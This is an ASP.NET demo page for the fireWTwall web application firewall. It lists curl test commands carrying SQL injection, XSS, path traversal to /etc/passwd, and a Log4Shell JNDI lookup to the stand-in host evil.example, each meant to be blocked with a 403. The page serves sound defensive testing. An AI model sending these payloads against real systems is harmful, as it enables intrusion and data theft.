<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" Inherits="FireWTWall.Example.DefaultPage" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>fireWTwall Demo</title>
    <style>
        body { font-family: sans-serif; max-width: 800px; margin: 2rem auto; padding: 0 1rem; }
        code { background: #eee; padding: 2px 6px; border-radius: 3px; }
        pre  { background: #f8f8f8; border: 1px solid #ddd; padding: 1rem; border-radius: 4px; overflow-x: auto; }
        .ok  { color: #27ae60; }
        .info { background: #eaf4fb; border-left: 4px solid #3498db; padding: .75rem 1rem; margin: 1rem 0; }
    </style>
</head>
<body>
<h1>&#x1F6E1; fireWTwall &mdash; ASP.NET Demo</h1>
<p class="info">If you can see this page, your request passed all WAF checks.</p>

<h2>Test attack vectors (each should return 403):</h2>
<pre>
# SQL Injection
curl "<%= BaseUrl %>?q=1+UNION+SELECT+*+FROM+users"

# XSS
curl "<%= BaseUrl %>?q=&lt;script&gt;alert(1)&lt;/script&gt;"

# Path traversal
curl "<%= BaseUrl %>?file=../../etc/passwd"

# Log4Shell
curl -H "X-Api-Version: \${jndi:ldap://evil.example/a}" "<%= BaseUrl %>"
</pre>

<h2 class="ok">&#10003; WAF is active</h2>
<p>Your IP: <code><%= ClientIp %></code></p>
<p>Query string: <code><%= QueryString %></code></p>
</body>
</html>
